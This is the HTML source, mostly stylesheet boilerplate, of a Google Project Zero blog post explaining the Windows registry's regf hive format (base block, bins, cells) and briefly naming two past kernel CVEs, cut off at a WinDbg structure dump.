5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:middle;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:488.2pt;border-top-color:#000000;border-bottom-style:solid}.MvcjwGOuIU-c66{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:middle;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:237.8pt;border-top-color:#000000;border-bottom-style:solid}.MvcjwGOuIU-c75{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:2.2pt;width:55.5pt;border-top-color:#000000;border-bottom-style:dotted}.MvcjwGOuIU-c73{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:172.5pt;border-top-color:#000000;border-bottom-style:solid}.MvcjwGOuIU-c23{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:260pt;border-top-color:#000000;border-bottom-style:solid}.MvcjwGOuIU-c65{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:2.2pt;width:151.5pt;border-top-color:#000000;border-bottom-style:dotted}.MvcjwGOuIU-c30{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:440.2pt;border-top-color:#000000;border-bottom-style:solid}.MvcjwGOuIU-c85{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:112.5pt;border-top-color:#000000;border-bottom-style:solid}.MvcjwGOuIU-c69{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:2.2pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:dotted;border-left-style:solid;border-bottom-width:1pt;width:55.5pt;border-top-color:#000000;border-bottom-style:solid}.MvcjwGOuIU-c76{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:2.2pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:dotted;border-left-style:solid;border-bottom-width:1pt;width:151.5pt;border-top-color:#000000;border-bottom-style:solid}.MvcjwGOuIU-c33{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:70.5pt;border-top-color:#000000;border-bottom-style:solid}.MvcjwGOuIU-c89{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:2.2pt;width:54.8pt;border-top-color:#000000;border-bottom-style:dotted}.MvcjwGOuIU-c61{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:middle;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:112.5pt;border-top-color:#000000;border-bottom-style:solid}.MvcjwGOuIU-c25{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:middle;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:250.5pt;border-top-color:#000000;border-bottom-style:solid}.MvcjwGOuIU-c87{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:2.2pt;width:210.8pt;border-top-color:#000000;border-bottom-style:dotted}.MvcjwGOuIU-c67{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:55.5pt;border-top-color:#000000;border-bottom-style:solid}.MvcjwGOuIU-c39{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:401.2pt;border-top-color:#000000;border-bottom-style:solid}.MvcjwGOuIU-c47{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:239.2pt;border-top-color:#000000;border-bottom-style:solid}.MvcjwGOuIU-c52{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:56.2pt;border-top-color:#000000;border-bottom-style:solid}.MvcjwGOuIU-c74{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:535.5pt;border-top-color:#000000;border-bottom-style:solid}.MvcjwGOuIU-c82{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:2.2pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:dotted;border-left-style:solid;border-bottom-width:1pt;width:54.8pt;border-top-color:#000000;border-bottom-style:solid}.MvcjwGOuIU-c58{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:210.8pt;border-top-color:#000000;border-bottom-style:solid}.MvcjwGOuIU-c68{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:475.5pt;border-top-color:#000000;border-bottom-style:solid}.MvcjwGOuIU-c42{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:243.8pt;border-top-color:#000000;border-bottom-style:solid}.MvcjwGOuIU-c79{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:54.8pt;border-top-color:#000000;border-bottom-style:solid}.MvcjwGOuIU-c37{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:408.8pt;border-top-color:#000000;border-bottom-style:solid}.MvcjwGOuIU-c35{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:100%;border-top-color:#000000;border-bottom-style:solid}.MvcjwGOuIU-c34{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:137.2pt;border-top-color:#000000;border-bottom-style:solid}.MvcjwGOuIU-c43{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:56.2pt;border-top-color:#000000;border-bottom-style:solid}.MvcjwGOuIU-c55{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:151.5pt;border-top-color:#000000;border-bottom-style:solid}.MvcjwGOuIU-c0{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:&quot;Arial&quot;;font-style:normal}.MvcjwGOuIU-c6{margin-block-start:0;margin-block-end:0;padding-top:12pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.MvcjwGOuIU-c5{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.MvcjwGOuIU-c13{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:&quot;Arial&quot;}.MvcjwGOuIU-c31{color:#666666;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:&quot;Arial&quot;}.MvcjwGOuIU-c70{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;text-align:left}.MvcjwGOuIU-c80{background-color:#ffffff;color:#999999;font-weight:400;font-size:10.5pt;font-family:&quot;Arial&quot;}.MvcjwGOuIU-c18{padding-top:14pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;text-align:left}.MvcjwGOuIU-c57{padding-top:16pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;text-align:left}.MvcjwGOuIU-c9{color:#000000;text-decoration:none;vertical-align:baseline;font-style:normal}.MvcjwGOuIU-c54{color:#434343;font-weight:400;font-size:14pt;font-family:&quot;Arial&quot;}.MvcjwGOuIU-c28{border-spacing:0;border-collapse:collapse;margin-right:auto}.MvcjwGOuIU-c24{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.MvcjwGOuIU-c71{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:center}.MvcjwGOuIU-c88{border-spacing:0;border-collapse:collapse;margin-right:auto}.MvcjwGOuIU-c1{font-size:9pt;font-family:&quot;Roboto Mono&quot;;color:#188038;font-weight:400}.MvcjwGOuIU-c2{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.MvcjwGOuIU-c21{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:center}.MvcjwGOuIU-c19{color:#666666;font-weight:400;font-size:12pt;font-family:&quot;Arial&quot;}.MvcjwGOuIU-c8{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.MvcjwGOuIU-c3{orphans:2;widows:2;height:11pt}.MvcjwGOuIU-c14{font-weight:700;font-size:11pt;font-family:&quot;Arial&quot;}.MvcjwGOuIU-c7{font-size:9pt;font-weight:400;font-family:&quot;Roboto Mono&quot;}.MvcjwGOuIU-c17{text-decoration:none;vertical-align:baseline;font-style:normal}.MvcjwGOuIU-c20{background-color:#ffffff;color:#161616;font-size:10.5pt}.MvcjwGOuIU-c40{font-weight:400;font-size:16pt;font-family:&quot;Arial&quot;}.MvcjwGOuIU-c29{margin-left:180pt;padding-left:0pt}.MvcjwGOuIU-c26{margin-left:72pt;padding-left:0pt}.MvcjwGOuIU-c38{margin-left:108pt;padding-left:0pt}.MvcjwGOuIU-c50{margin-left:144pt;padding-left:0pt}.MvcjwGOuIU-c16{margin-left:36pt;padding-left:0pt}.MvcjwGOuIU-c22{font-weight:400;font-family:Consolas,&quot;Courier New&quot;}.MvcjwGOuIU-c84{max-width:468pt;padding:72pt 72pt 72pt 72pt}.MvcjwGOuIU-c12{orphans:2;widows:2}.MvcjwGOuIU-c51{color:#1f2328;font-size:12pt}.MvcjwGOuIU-c60{margin-left:216pt;padding-left:0pt}.MvcjwGOuIU-c72{height:23.4pt}.MvcjwGOuIU-c78{background-color:#fff2cc}.MvcjwGOuIU-c83{background-color:#ffffff}.MvcjwGOuIU-c41{vertical-align:super}.MvcjwGOuIU-c36{font-style:normal}.MvcjwGOuIU-c11{height:11pt}.MvcjwGOuIU-c59{background-color:#d9ead3}.MvcjwGOuIU-c53{background-color:#f4cccc}.MvcjwGOuIU-c32{font-size:9pt}.MvcjwGOuIU-c64{background-color:#d9d9d9}.MvcjwGOuIU-c86{color:#999999}.MvcjwGOuIU-c45{height:21pt}.MvcjwGOuIU-c15{font-weight:700}.MvcjwGOuIU-c63{background-color:#b6d7a8}.MvcjwGOuIU-c10{font-style:italic}.MvcjwGOuIU-c49{color:#37474f}.MvcjwGOuIU-c81{height:21.6pt}.MvcjwGOuIU-c4{height:0pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:&quot;Arial&quot;}p{margin:0;color:#000000;font-size:11pt;font-family:&quot;Arial&quot;}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class=&quot;c83 c84 doc-content&quot;&gt;&lt;div&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c86&quot;&gt;Posted by Mateusz Jurczyk, Google Project Zero&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;As previously mentioned in the second installment of the blog post series (&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2024/04/the-windows-registry-adventure-2.html&quot;&gt;&amp;quot;A brief history of the feature&amp;quot;&lt;/a&gt;&lt;/span&gt;&lt;span&gt;), the binary format used to encode registry hives from Windows NT 3.1 up to the modern Windows 11 is called &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;regf. In a way, it is quite special, because it represents a registry subtree simultaneously on disk and in memory, as opposed to most other common file formats. Documents, images, videos, etc. are generally designed to store data efficiently on disk, and they are subsequently parsed to and from different in-memory representations whenever they are read or written. This seems only natural, as offline storage and RAM come with different constraints and requirements. On disk, it is important that the data is packed as tightly as possible, while in memory, easy and efficient random access is typically prioritized. The regf format aims to bypass the reparsing step &amp;ndash; likely to optimize the memory/disk synchronization process &amp;ndash; and reconcile the two types of data encodings into a single one that is both relatively compact and easy to operate on at the same time. This explains, for instance, why hives don&amp;#39;t natively support compression (but the clients are of course free to store compressed data in the registry). This unique approach comes with its own set of challenges, and has been a contributing factor in a number of historical vulnerabilities.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;Throughout the 30 years of the format&amp;#39;s existence, Microsoft has never released its official specification. However, the data layout of all of the building blocks making up a hive (file header, bin headers, cell structures) are effectively public through the PDB symbols for the Windows kernel image (ntoskrnl.exe) available on the &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/microsoft-public-symbols&quot;&gt;Microsoft Symbol Server&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. Furthermore, the Windows Internals book series also includes a section that delves into the specifics of the regf format (named &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c10&quot;&gt;Hive structure&lt;/span&gt;&lt;span&gt;). Lastly, forensics experts have long expressed interest in the format for analysis purposes, resulting in the creation of several unofficial specifications based on reverse engineering, experimentation and deduction. These sources have been listed in my earlier &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2024/06/the-windows-registry-adventure-3.html&quot;&gt;Learning resources&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;blog post; the two most extensive specifications of this kind can be found &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://github.com/libyal/libregf/blob/main/documentation/Windows%2520NT%2520Registry%2520File%2520(REGF)%2520format.asciidoc&quot;&gt;here&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://github.com/msuhanov/regf/blob/master/Windows%2520registry%2520file%2520format%2520specification.md&quot;&gt;here&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;. The intent of this post is not to repeat the information compiled in the existing resources, but rather to highlight specific parts of the format that have major relevance to security, or provide some extra context where I found it missing. A deep understanding of the low-level regf format will prove invaluable in grasping many of the higher-level concepts in the registry, as well as the technical details of software bugs discussed in future blog posts.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;MvcjwGOuIU-c70 MvcjwGOuIU-c12&quot; id=&quot;h.q4886tcewkdo&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c40&quot;&gt;The hive structure: header, bins and cells&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;On the lowest level, data in hives is organized in chunks of 4 KiB (0x1000 bytes), incidentally the size of a standard memory page in the x86 architecture. The first 4 KiB always correspond to the header (also called the &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c10&quot;&gt;base block&lt;/span&gt;&lt;span&gt;), followed by one or more &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c10&quot;&gt;bins&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;, each being a multiple of 4 KiB in length. The header specifies general information about the hive (signature, version, etc.), while bins are an abstraction layer designed to enable the fragmentation of hive mappings in virtual memory &amp;ndash; more on that later.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;Each bin starts with a 32-byte (0x20) header, followed by one or more &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c10&quot;&gt;cells&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;that completely fill the bin. A cell is the smallest unit of data in a hive that has a specific purpose (e.g. describes a key, value, security descriptor, and so on). The data of a cell is preceded by a 32-bit integer specifying its size, which must be a multiple of eight (i.e. its three least significant bits are clear), and is either in the free or allocated state. A free (unused) cell is indicated by a positive size, and an allocated cell is indicated by a negative one. For example, a free cell of 32 bytes has a length marker of 0x00000020, while an active cell of 128 bytes has its size encoded as 0xFFFFFF80. This visibly demonstrates the hybrid on-disk / in-memory nature of the hive format as opposed to other classic formats, which don&amp;#39;t intentionally leave large chunks of unused space in the files.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The overall file structure is illustrated in the diagram below:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiQtJm0XNkozXGxjQnB9n1ka9OuxP7lrLSQN1KZF-Zc60Z06dBEz3AAA8aAYnmdrU4imLebCFvF6qXaE0h-uA_iXnuyAisG90JWawSAMPPaToLdXMGeC4FlyGz42FWkf1bPhJmwSez8Ot-DLI29n4jinIXswZ-LQoLyWX7PIKVF5EwkRoAXNUFYIdcCOwo/s1999/image8.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiQtJm0XNkozXGxjQnB9n1ka9OuxP7lrLSQN1KZF-Zc60Z06dBEz3AAA8aAYnmdrU4imLebCFvF6qXaE0h-uA_iXnuyAisG90JWawSAMPPaToLdXMGeC4FlyGz42FWkf1bPhJmwSez8Ot-DLI29n4jinIXswZ-LQoLyWX7PIKVF5EwkRoAXNUFYIdcCOwo/s1200/image8.png&quot; border=&quot;0&quot; alt=&quot;Pictoral representation of the overall file structure&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Pictoral representation of the overall file structure&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;In the Windows kernel, internal functions responsible for handling these low-level hive objects (base block, bins, cells) have names starting with &amp;quot;Hv&amp;quot;, for example HvCheckHive, HvpAllocateBin or HvpViewMapCleanup. This part of the registry codebase is crucial as it forms the foundation of the registry logic, enabling the Configuration Manager to easily allocate, free, and access hive cells without concerning itself with the technical details of memory management. It is also a place with significant potential for optimizations, such as the incremental logging added in Windows 8.1, or section-based registry introduced in Windows 10 April 2018 Update (RS4). Both of these mechanisms are well described in the Windows Internals 7 (Part 2) book.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;While integral to the correct functioning of the registry, hive management does not constitute a very large part of the overall registry-related codebase. In my analysis of the registry code growth shown in blog post #2, I counted 100,007 decompiled lines of code corresponding to this subsystem in Windows 11 kernel build 10.0.22621.2134. Out of these, only 10,407 or around 10.4% correspond to hive memory management. This is also reflected in my findings: out of the 52 CVEs assigned by Microsoft, only two of them were directly related to a Hv* function implementation &amp;ndash; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451463&quot;&gt;CVE-2022-37988&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, a logic bug in HvReallocateCell leading to memory &lt;/span&gt;&lt;span&gt;corruption,&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451731&quot;&gt;CVE-2024-43452&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;, a double-fetch while loading hives from remote network shares. This is not to say that there aren&amp;#39;t more bugs in this mechanism, but their quantity is likely proportional to its size relative to the rest of the registry-related code.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Let&amp;#39;s now have a closer look at how each of the basic objects in the hive are encoded and what information they store, starting with the base block.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;MvcjwGOuIU-c57 MvcjwGOuIU-c12&quot; id=&quot;h.2aivd8b843r&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c54 MvcjwGOuIU-c17&quot;&gt;Base block&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The base block is represented by a structure called _HBASE_BLOCK in the Windows Kernel, and its layout can be displayed in WinDbg:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;dt&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;_HBASE_BLOCK&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;nt!_HBASE_BLOCK&lt;/span&gt;&lt;/p&gt;
